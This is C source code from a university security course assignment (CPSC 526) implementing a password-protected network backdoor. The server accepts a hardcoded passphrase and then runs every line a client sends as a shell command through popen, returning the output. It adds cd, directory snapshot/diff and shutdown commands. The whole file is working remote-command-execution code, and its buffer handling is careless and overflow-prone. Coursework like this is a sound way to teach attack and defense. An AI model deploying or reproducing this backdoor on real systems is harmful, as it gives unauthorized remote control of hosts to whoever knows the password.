/*
  CPSC 526 - Asg 2
  Gregory Muchka 10153582
  Matthew Powaschuk 30022573

  The skeleton client-server code was taken from the lecture slides, credit 
  to Pavol Federl for that code.
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

//This function prints an error and terminates the server.
void error(const char *msg) {
  perror(msg);
  exit(1);
}

void checkFiles(char *snap, char *d_snap, int h_check, int newsockfd);
int splitString(int index, char *from ,char start ,char end ,char *into);
void getHash(int index, char *file, char* hash);
int helpcommand(char* command);
void filemanip(char* buffer,int newsockfd);

int main(int argc, char *argv[]) {
  int sockfd, newsockfd, portno;
  socklen_t clilen;
  char buffer[256];
  struct sockaddr_in serv_addr, cli_addr;
  int n;
  int password = 0; //Checks if password entered 0 = false
  int logout = 0; //Checks if logout command issued, will be 1 if it has
  int off = 0; //Checks if off command issued, will be 1 if it has
  int i, j;
  char path[256];
  char helpwith[256]; //Buffer that will hold the command that the user
                      //has requested help with.
  char man[256]; //Buffer than will concat the helpwith with the string "man "
  FILE *fp;
  int status;
  
  if (argc < 2) {
    fprintf(stderr,"ERROR, no port provided\n");
    exit(1);
  }
  sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if (sockfd < 0)
    error("ERROR opening socket");

  bzero((char *) &serv_addr, sizeof(serv_addr));
  portno = atoi(argv[1]);
  serv_addr.sin_family = AF_INET;
  serv_addr.sin_addr.s_addr = INADDR_ANY;
  serv_addr.sin_port = htons(portno);
  if (bind(sockfd, (struct sockaddr *) &serv_addr,
	   sizeof(serv_addr)) < 0)
    error("ERROR on binding");
    
  while(off == 0)
    {
      listen(sockfd,5);
      clilen = sizeof(cli_addr);
      newsockfd = accept(sockfd,
			 (struct sockaddr *) &cli_addr,
			 &clilen);
      if (newsockfd < 0)
	error("ERROR on accept");

      /**/
      bzero(buffer,256);
      n = write(newsockfd, "Enter Password >: ", 18);
      n = read(newsockfd,buffer,255);

      //This will authenticate the user, password is "valar morghulis"
      if((strlen(buffer) == 16) && (strncmp(buffer, "valar morghulis\n", 16) == 0))
	{
	  n = write(newsockfd, "Valar Dohaeris\r\n", 16);
	  password = 1;
	}
      else
	{
	  n = write(newsockfd, "Incorrect\r\n", 11);
	  password = 0;
	}
      
      if (password == 1)
	{
	  logout = 0; //This resets logout if a 2nd+ peer is connecting in
	              //sequence
	  
	  while(off == 0 && logout == 0){

	    n = write(newsockfd,">: ", 3);
	    bzero(buffer,256);
	    n = read(newsockfd,buffer,255);

	    if (n < 0) error("ERROR reading from socket");

	    //Checks if cp,rm, and mv commands would work
	    if((strncmp(buffer,"cp ",3) == 0)
	       || (strncmp(buffer,"rm ",3) == 0)
	       || (strncmp(buffer,"mv ",3) == 0))
	      {
		filemanip(buffer,newsockfd);
	      }
	    
	      
	    //Runs the command in a shell, if the command
	    //is invalid no output will be shown to client.
	    fp = popen(buffer, "r");
	    if (fp == NULL)
	      printf("Response Could Not Be Read");
	      
	    //generic help command
	    if(strncmp(buffer, "help\n",5) == 0){
	      n = write(newsockfd,"The current supported commands are:\n\
pwd\ncd\nls\ncp\nmv\nrm\ncat\nsnap\ndiff\nlogout\noff\nwho\nps\n",87);
	      n = write(newsockfd,"Please type help [command] for help with \
a specific command\n",60);
	    }

	    //specific help commands
	    else if(strncmp(buffer,"help ",5) == 0){
	      strncpy(man,"man ",4);
	      splitString(0,buffer,' ','\n',helpwith);

	      if(strncmp(helpwith,"snap\0",5) == 0)
		{
		  n = write(newsockfd, "This command will take a snapshot of \
the current directory for later comparison with diff\n",91);
		}

	      else if(strncmp(helpwith,"diff\0",5) == 0)
		{
		  n = write(newsockfd,"This command will check if anything has \
changed in the current directory from the previous snap and output any \
changes\n",120);
		}

	      else if(strncmp(helpwith,"logout\0",7) == 0)
		{
		  n = write(newsockfd,"This command will log you out of \
the backdoor without terminating it\n",70);
		}

	      else if(strncmp(helpwith,"off\0",4) == 0)
		{
		  n = write(newsockfd,"This command will terminate the backdoor\n",41);
		}

	      else if(helpcommand(helpwith))//If the command is supported
		{                           //and has a manual on linux
		  strncat(man,helpwith,strlen(helpwith));
		  fp = popen(man,"r");
		}

	      else
		{
		  n = write(newsockfd, "This is not a valid command\n",28);
		}
	      bzero(helpwith,256);
	    }
	    //cd command
	    else if(strncmp(buffer, "cd ", 3) == 0){
	      bzero(path,256);
	      for(i = 3, j = 0; i < 256; i++, j++){
		if(buffer[i] == '\n') break;
		path[j] = buffer[i];
	      }
	      if(chdir(path) == 0)
		n = write(newsockfd,"Directory changed\n",19);
	      else
		n = write(newsockfd,"cd failed\n",10);
	    }
	    //off command
	    if((strlen(buffer) == 4) && (strncmp(buffer,"off\n",2) == 0))
	      {
		n = write(newsockfd, "Shutting down...\r\n",18);
		off = 1;
	      }
	    //logout command
	    else if((strlen(buffer) == 7) && (strncmp(buffer, "logout\n",2) == 0))
	      {
		n = write(newsockfd, "Logging off...\r\n",16);
		logout = 1;
	      }
	    //snap command
	    else if(strncmp(buffer, "snap\n", 4) == 0){
	      fp = popen("sha256sum * > snapshot", "w");
	    }
	    //diff command
	    else if(strncmp(buffer, "diff\n", 4) == 0){
	        
	      //try and open snap file
	      FILE *snap_file = fopen("snapshot", "r");
	      
	      //check if file exists
	      if(snap_file != NULL){
		int index;
		int file_size;

		//get file size
		fseek(snap_file, 0, SEEK_END); 
		file_size = ftell(snap_file);
		fseek(snap_file, 0, SEEK_SET);

		//put snapshot into array
		char snap[file_size+1];
		for(index = 0; index < file_size; index++){
		  fscanf(snap_file, "%c", &(snap[index]));
		}
		snap[index] = '\0';
		printf("%i\n",strlen(snap));
		fclose(snap_file);
		    
		//make file for comparison
		system("sha256sum * > snapshot2");

		//try opening it up
		FILE *diff_snap_file = fopen("snapshot2", "r");
		int diff_file_size;

		//if it worked read it into an array
		if(diff_snap_file != NULL){
		  fseek(diff_snap_file, 0, SEEK_END); 
		  diff_file_size = ftell(diff_snap_file);
		  fseek(diff_snap_file, 0, SEEK_SET);
		        
		  char diff_snap[diff_file_size+1];
		    
		  for(index = 0; index < diff_file_size; index++){
		    fscanf(diff_snap_file, "%c", &diff_snap[index]);
		  }
		  diff_snap[index] = '\0';
		  fclose(diff_snap_file);
		        
		  //checks for added and modified files
		  checkFiles(snap, diff_snap, 1, newsockfd);

		  //checks for deleted files
		  checkFiles(diff_snap, snap, 0, newsockfd);
		}

		//remove second snapshot file
		system("rm snapshot2");
	      }
	      //If no snapshot exists
	      else
		n = write(newsockfd, "No snapshot found\n", 18);
	    }
	    
	    //Writes output of shell command
	    while (fgets(buffer, 256, fp) != NULL)
	      {
		n = write(newsockfd, buffer, strlen(buffer));
	      }
	    //status = pclose(fp);
	    if (n < 0) error("ERROR writing to socket");

	    //Checks if rm, mv, or cp worked
	    

      
	  }
	}
      /**/
      close(newsockfd);
	
    }
  //deletes snapshot if one exists, else this command doesn't work
  popen("rm snapshot","r");
  
  close(sockfd);
  return 0;
}

//Used for help command, checks if command manual requested is supported by the
//linux command man [command]
int helpcommand(char* command){
  int result = 0;
  if((strncmp(command,"pwd\0",4) == 0)
     || (strncmp(command,"ls\0",3) == 0)
     || (strncmp(command,"cp\0",3) == 0)
     || (strncmp(command,"mv\0",3) == 0)
     || (strncmp(command,"rm\0",3) == 0)
     || (strncmp(command,"cat\0",4) == 0)
     || (strncmp(command,"who\0",4) == 0)
     || (strncmp(command,"ps\0",3) == 0)
     || (strncmp(command,"cd\0",3) == 0))
    result = 1;
  return result;
}

//gets the file name based on a dilemeter and returns the index of he end of th hash of that file
int splitString(int index, char *from ,char start ,char end ,char *into)
{
  *into = '\0';
  int count = 0;
  int marker = 0;
  /* First find the start*/
  while (from[index++] != start);

  /* Now we are either at the end of the string, or found the character */
  if (from[index] == '\0')
    return 0;  

  /* Copy the string while we don't see the `end` character */
  marker = index;
  while (from[index] != end)
    into[count++] = from[index++];

  /* Now terminate the output string */
  into[count] = '\0';
  //return where the end of the hash is
  return marker;
}
//retrieves the hash of the given file
void getHash(int index, char *file, char *hash){

  int start = index - 65;
  int len = strlen(file); 
  int count = 0;
  
  while(start <= index) {
    hash[count] = file[start];
    start++;
    count++;
  }
}
// no return function that does comparison checking for files
void checkFiles(char *snap, char *d_snap, int h_check, int newsockfd){

  char file[256];//file path
  char d_file[256];//file path from comparison
  char hash[265];//hash of file path
  char d_hash[256];//hash of file path from comparison
  int eoh = 0;//end of hash marker, used to index the hash
  int d_eoh = 0;//end of hash marker used to index hash of path for comparison
  int i = 0;
  int j = 0;
  int found = 0;
  int difference = 0; //marks if any differences found
  
  //look at all files
  while(i < strlen(snap))
    {
      //gets the index of the hash value and the files name
      eoh = splitString(i, snap, ' ', '\n', file);
      //compare the rest of the files
      while(j < strlen(d_snap))
	{
	  //gets the index of the hash value and the files name
	  d_eoh = splitString(j, d_snap, ' ', '\n', d_file);
	  //if found check hash
	  if(strcmp(file, d_file) == 0)
	    {
	      found = 1;
	      //if you are checking for hash values,
	      // you wont check this if you are looking for files that have been deleted
	      if(h_check == 1){
		getHash(eoh, snap, hash);
		getHash(d_eoh, d_snap, d_hash);
		//if hash is different say it is, unless the file is the
		//snapshot as that is just a temporary file
		if((strncmp(hash, d_hash, 65) != 0) && (strncmp(file," snapshot",9) !=0)){
		  difference = 1;
		  strcat(file, " was modified\n");
		  write(newsockfd, file, strlen(file));
		}
		break;
	      }
	    }
	    
	  //increment counted to next file location  
	  j = j+66+strlen(d_file); 
	}
      //if it was not found and you didnt checked the hash then it was deleted
      if(found == 0 && h_check == 1){
	difference = 1;
	strcat(file, " was deleted\n");
	write(newsockfd, file, strlen(file));
      }
      //if it was not found and you did check the hash it was added
      if(found == 0 && h_check == 0 && strcmp(file, " snapshot") != 0){
	difference = 1;
	strcat(file, " was added\n");
	write(newsockfd, file, strlen(file));
      }
      //reset counters and increment i counter
      found = 0;
      j = 0;
      i = i+67+strlen(file);
    }

  if(difference == 0 && h_check == 1)
    write(newsockfd,"No differences\n",15);
}


//This function will write any errors that would occur
//in mv, cp, and rm commands to the socket.
//Initializing i to 3 in this allows us to skip the first space delimiter
//as all commands are of same length before arguments.
void filemanip(char* buffer, int newsockfd)
{
  int i = 3, j = 0, space = 0, nosecond = 0;
  char file[256];
  while(i < strlen(buffer) && space == 0 && nosecond == 0)
    {
      if(buffer[i] != ' ' && buffer[i] != '\n')
	file[j] = buffer[i];
      else if(buffer[i] == '\n') //checks if second command missing
	nosecond = 1;
      else                       //second space delimiter found
	space = 1; 
      i++;
      j++;
    }
  if(access(file,F_OK) != -1){   //checks if file is accessible
    if((strncmp(buffer,"cp ",3) == 0)
       || (strncmp(buffer,"mv ",3) == 0))
      {
	if(nosecond == 0 && space == 1)
	  {
	    if(buffer[i] == '\n') //checks for space followed by \n
	      nosecond = 1;
	  }
	if(nosecond == 0)
	  {
	    write(newsockfd,"OK\n",3);
	  }
	else
	  write(newsockfd,"Error: no second argument\n",26);
      }
    else
      {
	write(newsockfd,"OK\n",3);
      }
  }
  else
    {
      write(newsockfd,"Error: file does not exist\n",27);
    }
}

